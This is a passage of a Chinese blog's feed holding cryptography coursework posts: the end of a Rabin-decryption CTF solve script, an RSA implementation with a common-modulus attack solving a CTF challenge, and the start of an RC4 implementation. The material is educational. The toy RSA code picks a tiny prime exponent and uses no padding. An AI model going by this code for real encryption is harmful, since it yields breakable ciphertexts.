class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ans=rabin_decrypt(c,p,q,e=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        temp=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">print</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>攻击得到4个结果，经过筛选得到一段含有flag的有意义的明文：</p><p><img src="https://s2.ax1x.com/2019/01/16/kSbyYn.png" alt="kSbyYn.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;知其然，知其所以然
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之RSA公钥加密</title>
    <link href="https://gardenia30.top/2019/01/13/RSA%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%85%AC%E9%92%A5%E5%8A%A0%E5%AF%86/"/>
    <id>https://gardenia30.top/2019/01/13/RSA非对称公钥加密/</id>
    <published>2019-01-13T12:22:25.000Z</published>
    <updated>2019-01-13T13:03:11.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你知道什么叫非对称吗？<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用；</p><h2 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h2><p>1.随机选择两个不同大质数 p和 q，计算 <code>N=p×q</code></p><p>2.根据欧拉函数，求得<code>r=φ(N)=φ(p)φ(q)=(p−1)(q−1)</code></p><p>3.选择一个小于 r 的整数 e，使 e 和 r互质。并求得 e 关于 r 的模反元素，为 d，有 <code>ed≡1 mod red≡1 mod r</code></p><p>4.将 p 和 q 的记录销毁；</p><p>此时，<code>(N,e)</code>是公钥，<code>(N,d)</code>是私钥；</p><h2 id="消息加密"><a href="#消息加密" class="headerlink" title="消息加密"></a>消息加密</h2><p>首先需要将消息 m 以一个双方约定好的格式转化为一个小于  N，且与 N 互质的整数 n。如果消息太长，可以将消息分为几段，这也就是我们所说的分组加密，后对于每一部分利用如下公式加密：<code>n^e≡c(modN)</code>；</p><h2 id="消息解密"><a href="#消息解密" class="headerlink" title="消息解密"></a>消息解密</h2><p>利用密钥 d 进行解密：<code>c^d≡n(modN)</code>；</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="生成n字节的随机数"><a href="#生成n字节的随机数" class="headerlink" title="生成n字节的随机数"></a>生成n字节的随机数</h3><p>调用<code>os.urandom()</code>随机生成n字节的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandom</span><span class="params">(n)</span>:</span></span><br><span class="line">data=urandom(n)</span><br><span class="line">a=int(binascii.hexlify(data),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h3 id="第一次素性检验"><a href="#第一次素性检验" class="headerlink" title="第一次素性检验"></a>第一次素性检验</h3><p>首先进行第一次素性检验，检验100以内的素数是否为n的因数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">(n)</span>:</span></span><br><span class="line">dic_small=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>]</span><br><span class="line"><span class="comment"># print(len(dic_small))</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_small:</span><br><span class="line"><span class="keyword">if</span> n%x==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><h3 id="第二次素性检验"><a href="#第二次素性检验" class="headerlink" title="第二次素性检验"></a>第二次素性检验</h3><p>用Miller-rabin素性检验算法检验n，检验k次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_Miller</span><span class="params">(n,k)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n&lt;<span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">d=n<span class="number">-1</span></span><br><span class="line">r=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span>(d&amp;<span class="number">1</span>):</span><br><span class="line">r+=<span class="number">1</span></span><br><span class="line">d&gt;&gt;=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">a=getrandom(<span class="number">120</span>)</span><br><span class="line">x=pow(a,d,n)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span> <span class="keyword">or</span> x==n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(r<span class="number">-1</span>):</span><br><span class="line">x=pow(x,<span class="number">2</span>,n)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">if</span> x==n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><h3 id="通过两次素性检测"><a href="#通过两次素性检测" class="headerlink" title="通过两次素性检测"></a>通过两次素性检测</h3><p>产生byte字节的数，并且通过两次素性检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span><span class="params">(byte)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">n=getrandom(byte)</span><br><span class="line"><span class="keyword">if</span> test1(n):</span><br><span class="line"><span class="keyword">if</span> test_Miller(n,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><h3 id="产生公钥e"><a href="#产生公钥e" class="headerlink" title="产生公钥e"></a>产生公钥e</h3><p>产生一个和φ(n)互素的公钥e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gete</span><span class="params">(ol)</span>:</span></span><br><span class="line">e=getprime(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> ol%e!=<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> e</span><br></pre></td></tr></table></figure><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><p>加密时，先将明文进行16进制编码，然后转化为10进制计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexencode</span><span class="params">(str0)</span>:</span></span><br><span class="line">hexcode=base64.b16encode(str0)</span><br><span class="line">res=int(hexcode,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="16进制解码"><a href="#16进制解码" class="headerlink" title="16进制解码"></a>16进制解码</h3><p>解密时需要对计算出来的明文编码进行16进制解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdecode</span><span class="params">(str0)</span>:</span></span><br><span class="line">temp=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str0)):</span><br><span class="line"><span class="keyword">if</span> ord(str0[i])&gt;<span class="number">96</span> <span class="keyword">and</span> ord(str0[i])&lt;<span class="number">123</span>:</span><br><span class="line">temp+=chr(ord(str0[i])<span class="number">-32</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp+=str0[i]</span><br><span class="line">res=base64.b16decode(temp)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="分组加密一组"><a href="#分组加密一组" class="headerlink" title="分组加密一组"></a>分组加密一组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAencrypt_group</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">num1=hexencode(m)                            </span><br><span class="line"> c=pow(num1,e,n)                    <span class="comment">#cipher</span></span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="加密全部"><a href="#加密全部" class="headerlink" title="加密全部"></a>加密全部</h3><p>5个字符一组进行加密,将所有的密文连接在一起输出，将每个分组的密文存储在cip列表中用于以后的解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAencrypt_all</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(m),<span class="number">5</span>):</span><br><span class="line">temp=m[i:i+<span class="number">5</span>]</span><br><span class="line">group_cipher=RSAencrypt_group(temp,e,n)</span><br><span class="line">cip.append(group_cipher)</span><br><span class="line">res+=str(group_cipher)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="解密一组"><a href="#解密一组" class="headerlink" title="解密一组"></a>解密一组</h3><p>输入数字c进行RSA解密得到num1，然后再转化为16进制，再对16进制数进行解码变成明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAdecrypt_group</span><span class="params">(c,e,n,ol)</span>:</span></span><br><span class="line">d=gmpy2.invert(e,ol)</span><br><span class="line">num1=pow(c,d,n)</span><br><span class="line">str1=<span class="string">'&#123;:0x&#125;'</span>.format(num1)</span><br><span class="line">plain=hexdecode(str1)</span><br><span class="line"><span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><h3 id="解密全部"><a href="#解密全部" class="headerlink" title="解密全部"></a>解密全部</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAdecrypt_all</span><span class="params">(e,n,ol)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)):</span><br><span class="line">temp=RSAdecrypt_group(cip[i],e,n,ol)</span><br><span class="line">res+=temp</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性验证"><a href="#运行结果及正确性验证" class="headerlink" title="运行结果及正确性验证"></a>运行结果及正确性验证</h2><p><strong>理论证明：</strong></p><p>即我们要证<code>n^ed≡n(modN)</code>，已知<code>ed≡1modϕ(N)</code>，那么 <code>ed=kϕ(N)+1</code>，即需要证明</p><p><code>n^(kϕ(N)+1)≡n(modN)</code></p><p>这里我们分两种情况证明</p><p>第一种情况 gcd(n,N)=1，那么 <code>n^ϕ(N)≡1modN</code>，因此原式成立。</p><p>第二种情况 gcd(n,N)!=1，那么 n 必然是 p 或者 q 的倍数，并且 n 小于 N。我们假设<code>n=xp</code></p><p>那么 x 必然小于 q，又由于 q 是素数。那么<code>n^ϕ(q)≡1modq</code></p><p>进而<code>n^kϕ(N)=n^(k(p−1)(q−1))=(n^ϕ(q))^k(p−1)≡1modq</code></p><p>那么<code>n^(kϕ(N)+1)=n+uqn</code>进而<code>nkϕ(N)+1=n+uqxp=n+uxN</code>；所以原式成立。</p><p><strong>程序正确性：</strong></p><p>程序输入明文hello，加载出1024bit的大素数p和q，继续加载出公钥e，经过加密得到如下密文；就用上面得到的p,q,e,cipher，先计算出私钥d，再解密密文，得到如下明文hello，解密成功，算法正确性得到验证；</p><p><img src="https://s2.ax1x.com/2019/01/03/Fo8GnI.png" alt="Fo8GnI.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破，RSA算法选取的两个安全的大素数目前推荐长度为至少为1024比特；到现在为止，还没有任何可靠的攻击 RSA 算法的方式。</p><h3 id="RSA的共模攻击分析"><a href="#RSA的共模攻击分析" class="headerlink" title="RSA的共模攻击分析"></a>RSA的共模攻击分析</h3><h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击；</p><p>设两个用户的公钥分别为 e1和 e2，且两者互质。明文消息为 mm，密文分别为：<code>c1=m^e1(modN)</code> <code>c2=m^e2(modN)</code></p><p>当攻击者截获 c1和 c2后，就可以恢复出明文。用扩展欧几里得算法求出 <code>re1+se2=1modn</code>的两个整数 r 和 s，由此可得：</p><p><code>(c^r1)*(c^s2)≡(m^re1)*(m^se2)modn≡m^(re1+se2)modn≡m(modn)</code></p><h5 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h5><p>就拿CTF比赛Crypto中的一道题目来说：给出两组密文 message1,message2；给出两组分别的公钥是e1和e2；给出两组加密用的是同一个n；如何去计算出明文呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;</span><br><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;</span><br><span class="line">message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line">message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br></pre></td></tr></table></figure><p>可以看出两个公钥的 N 是一样的，并且两者的 e 互素。用上述原理写一个python脚本跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span></span><br><span class="line">e1 = <span class="number">773</span></span><br><span class="line">e2 = <span class="number">839</span></span><br><span class="line">message1=<span class="number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span></span><br><span class="line">message2=<span class="number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span></span><br><span class="line"><span class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><p>得出结果明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br></pre></td></tr></table></figure><p>这时候需要考虑当时明文是如何转化为这个数字了，这个应该是 ASCII 字符转换，进而我们使用如下代码得到 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">plain = str(plain)</span><br><span class="line"><span class="keyword">while</span> i &lt; len(plain):</span><br><span class="line">    <span class="keyword">if</span> plain[i] == <span class="string">'1'</span>:</span><br><span class="line">        flag += chr(int(plain[i:i + <span class="number">3</span>]))</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(int(plain[i:i + <span class="number">2</span>]))</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">###flag&#123;whenwethinkitispossible&#125;###</span></span><br></pre></td></tr></table></figure><h2 id="有效性和合理性分析"><a href="#有效性和合理性分析" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h2><p>公钥加密中密钥1024bit的密钥强度只能相当于对称加密中几十bit的强度，而且密钥的生成需要时间，所以还是对称加密的效率较高，而且耗时较短，速度比较快；一般通信中采用的就是明文采用对称加密的方法发出，而加解密密钥用公钥加密体制加密后发给接收方，这样效率会比较高；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你知道什么叫非对称吗？
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之RC4序列密码</title>
    <link href="https://gardenia30.top/2019/01/13/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4/"/>
    <id>https://gardenia30.top/2019/01/13/序列密码之RC4/</id>
    <published>2019-01-13T11:36:48.000Z</published>
    <updated>2019-01-13T13:03:13.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RC4比较简单，放篇实验报告水一波(滑稽脸)<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="序列密码之RC4算法"><a href="#序列密码之RC4算法" class="headerlink" title="序列密码之RC4算法"></a>序列密码之RC4算法</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>在密码学中，<strong>RC4</strong>是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4软件容易实现，密钥长度可变，简单，但也很有效果。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>RC4主要分为三个步骤，初始化 S 和 T 数组，初始化置换 S，生成密钥流。</p><h4 id="初始化S盒和T向量（初始化S和T）"><a href="#初始化S盒和T向量（初始化S和T）" class="headerlink" title="初始化S盒和T向量（初始化S和T）"></a>初始化S盒和T向量（初始化S和T）</h4><p>先初始化S，同时建立一个临时数组向量T，如果种子密钥的长度为256字节，则直接将K赋值给T，否则若种子密钥K的长度小于256，则将K的值赋给T的前|K|个元素，并不断重复加载K的值直到T被填满。将S和T分别存储在列表S1和T1里；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_S_T</span><span class="params">(s1,t1,k1)</span>:</span>    </span><br><span class="line"><span class="string">"""初始化S,T"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s1.append(i)</span><br><span class="line">t1.append(k1[i%len(k1)])</span><br></pre></td></tr></table></figure><h4 id="KSA密钥调度算法（置换S）"><a href="#KSA密钥调度算法（置换S）" class="headerlink" title="KSA密钥调度算法（置换S）"></a>KSA密钥调度算法（置换S）</h4><p>用来打乱S盒的初始排列顺序；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_s</span><span class="params">(s2,t2)</span>:</span></span><br><span class="line"><span class="string">"""更新S"""</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j=(j+s2[i]+t2[i])%<span class="number">256</span></span><br><span class="line">s2[i],s2[j]=s2[j],s2[i]</span><br></pre></td></tr></table></figure><h4 id="PRGA伪随机生成算法（生成密钥流）"><a href="#PRGA伪随机生成算法（生成密钥流）" class="headerlink" title="PRGA伪随机生成算法（生成密钥流）"></a>PRGA伪随机生成算法（生成密钥流）</h4><p>生成密钥流存储在flow1列表中；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_flow</span><span class="params">(s3,p1,flow1)</span>:</span></span><br><span class="line"><span class="string">"""生成密钥流"""</span>  </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(p1)):</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">j=(j+s3[i])%<span class="number">256</span></span><br><span class="line">s3[i],s3[j]=s3[j],s3[i]</span><br><span class="line">t=(s3[i]+s3[j])%<span class="number">256</span></span><br><span class="line">flow1.append(s3[t])</span><br></pre></td></tr></table></figure><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>将密钥流与明文字节异或得出密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_flow</span><span class="params">(p2,flow2,c)</span>:</span></span><br><span class="line"><span class="string">"""生成密文"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p2)):</span><br><span class="line">temp=(flow2[i]^ord(p2[i]))</span><br><span class="line">temp1=hex(temp)</span><br><span class="line">c.append(temp1[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>将密钥流与密文字节异或得出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rc4</span><span class="params">(c1,flow3,p_flow)</span>:</span></span><br><span class="line"><span class="string">"""解密"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">temp2=int(<span class="string">"0x"</span>+c1[i],<span class="number">16</span>)</span><br><span class="line">p_flow.append(chr(flow3[i]^temp2))</span><br></pre></td></tr></table></figure><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_S_T</span><span class="params">(s1,t1,k1)</span>:</span>    </span><br><span class="line"><span 